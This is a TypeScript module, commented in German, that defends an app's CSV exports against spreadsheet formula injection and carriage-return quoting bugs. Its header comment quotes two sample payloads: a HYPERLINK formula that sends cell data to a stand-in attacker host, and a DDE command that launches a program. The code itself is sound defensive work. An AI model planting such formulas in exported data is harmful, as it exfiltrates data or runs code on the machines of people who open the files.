/**
 * CSV-Werte, die eine Tabellenkalkulation als Text liest und nicht als Programm.
 *
 * Ein CSV-Export hat zwei getrennte Leser, und bis Track 19 war nur an einen
 * gedacht:
 *
 *  1. Der Parser. Fuer ihn muss ein Wert gequotet werden, sobald er das
 *     Trennzeichen, ein Anfuehrungszeichen oder einen Zeilenumbruch enthaelt.
 *     Beide bestehenden Export-Routen taten das — aber nur fuer `\n`, nicht
 *     fuer `\r`. Ein Wert mit einem einzelnen Wagenruecklauf (ein Name, der
 *     aus einem Windows-Formular kommt) blieb ungequotet und zerlegte die
 *     Zeile in zwei; ab dort verrutscht die ganze Datei um eine Spalte.
 *
 *  2. Excel, LibreOffice Calc und Google Sheets. Fuer die ist eine Zelle, die
 *     mit `=`, `+`, `-`, `@`, Tab oder Wagenruecklauf beginnt, kein Text,
 *     sondern eine Formel — und die wird beim Oeffnen ausgewertet. Das ist der
 *     eigentliche Angriff: `newsletter_subscribers.name` kommt aus einem
 *     oeffentlichen, nicht angemeldeten Formular (POST /api/newsletter, `name`
 *     bis 120 Zeichen), `profiles.full_name` aus der Registrierung. Wer sich
 *     dort
 *
 *         =HYPERLINK("https://angreifer.example/?d="&A1;"Rechnung oeffnen")
 *
 *     nennt, legt eine anklickbare Ausleitung in die Datei, die ein Admin
 *     spaeter als Abonnenten- oder Benutzerliste herunterlaedt und oeffnet.
 *     Mit `=cmd|'/c calc'!A0` (DDE) wird daraus in aelteren Excel-Staenden ein
 *     Programmstart auf dem Rechner des Admins. Die Nutzereingabe verlaesst
 *     ChairMatch hier vollstaendig — sie wird nicht mehr im Browser gerendert,
 *     wo React sie escapen wuerde, sondern in einem fremden Programm geoeffnet.
 *
 * Gegen (2) hilft Quoting NICHT: Excel wertet auch `"=1+1"` als Formel aus.
 * Der einzige verlaessliche Weg ist ein vorangestelltes Apostroph, das die
 * Tabellenkalkulation als "ab hier Text" liest (OWASP: CSV Injection). Reine
 * Zahlen bleiben unangetastet, sonst waere jeder negative Betrag im
 * Steuerberater-Export ploetzlich Text.
 */

/** Fuehrende Zeichen, die eine Tabellenkalkulation als Formelbeginn liest. */
const FORMULA_LEAD = /^[=+\-@\t\r]/

/** Ein Wert, der als Zahl gemeint ist — deutsches wie englisches Dezimaltrennzeichen. */
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/

/**
 * Steuerzeichen, die in keiner CSV-Zelle etwas zu suchen haben — ausser Tab,
 * Zeilenumbruch und Wagenruecklauf, die oben bzw. beim Quoting behandelt
 * werden.
 */
// eslint-disable-next-line no-control-regex
const CONTROL_CHARS = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g

/**
 * Eine einzelne Zelle: erst entschaerfen, dann quoten.
 *
 * @param value      beliebiger Wert; null/undefined werden zur leeren Zelle
 * @param delimiter  Feldtrenner der Zieldatei (`,` oder `;`)
 */
export function csvCell(value: unknown, delimiter = ','): string {
  if (value === null || value === undefined) return ''

  let s = String(value).replace(CONTROL_CHARS, '')

  // (2) Formel-Praefix — Zahlen ausgenommen.
  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) {
    s = `'${s}`
  }

  // (1) Quoting fuer den Parser — inklusive `\r`.
  if (
    s.includes(delimiter) ||
    s.includes('"') ||
    s.includes('\n') ||
    s.includes('\r')
  ) {
    return `"${s.replace(/"/g, '""')}"`
  }
  return s
}

/** Eine Zeile aus rohen Werten. */
export function csvRow(values: readonly unknown[], delimiter = ','): string {
  return values.map((v) => csvCell(v, delimiter)).join(delimiter)
}

export interface CsvOptions {
  /** Feldtrenner. Default `,`; der Steuerberater-Export nutzt `;`. */
  delimiter?: string
  /** Zeilenende. Default `\r\n` (RFC 4180). */
  eol?: string
  /** UTF-8-BOM voranstellen, damit Excel Umlaute richtig liest. Default false. */
  bom?: boolean
}

/** Vollstaendige CSV-Datei aus Kopfzeile und Datenzeilen. */
export function toCsv(
  headers: readonly unknown[],
  rows: readonly (readonly unknown[])[],
  options: CsvOptions = {},
): string {
  const { delimiter = ',', eol = '\r\n', bom = false } = options
  const lines = [
    csvRow(headers, delimiter),
    ...rows.map((row) => csvRow(row, delimiter)),
  ]
  return (bom ? '﻿' : '') + lines.join(eol)
}
